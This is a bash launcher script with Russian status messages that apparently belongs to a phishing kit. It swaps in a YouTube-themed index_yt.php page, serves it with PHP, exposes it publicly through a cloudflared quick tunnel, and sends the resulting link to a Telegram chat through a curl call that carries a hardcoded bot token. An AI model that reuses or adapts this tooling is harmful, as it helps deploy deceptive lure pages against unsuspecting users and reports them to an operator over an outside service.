#!/bin/bash
cp index_yt.php index.php
pkill -9 -f php > /dev/null 2>&1
pkill -9 -f cloudflared > /dev/null 2>&1
php -S 127.0.0.1:4444 -t . > /dev/null 2>&1 &
cloudflared tunnel --url http://127.0.0.1:4444 > .log 2>&1 &
clear
echo -e "\e[1;31m[!] YOUTUBE SYSTEM DEPLOYED\e[0m"
echo -e "\e[1;34m[*] Ожидание генерации ссылки...\e[0m"

SENT=false
while true; do
    LINK=$(grep -o 'https://[-a-z0-9.]*\.trycloudflare\.com' .log | head -n 1)
    if [ ! -z "$LINK" ] && [ "$SENT" = false ]; then
        sleep 8
        curl -s -X POST "https://api.telegram.org/bot8749123902:AAGnWBYBrUj4pHcE2btDjtBqpMVKMFQB7yQ/sendMessage" -d chat_id="-1003463348834" -d text="✅ Ссылка YouTube готова: $LINK" > /dev/null 2>&1
        echo -e "\e[1;32m[+] Ссылка отправлена в Telegram.\e[0m"
        echo -e "\e[1;33m[!] СИСТЕМА АКТИВНА. НЕ ЗАКРЫВАЙ ЭТО ОКНО.\e[0m"
        SENT=true
    fi
    sleep 5
done
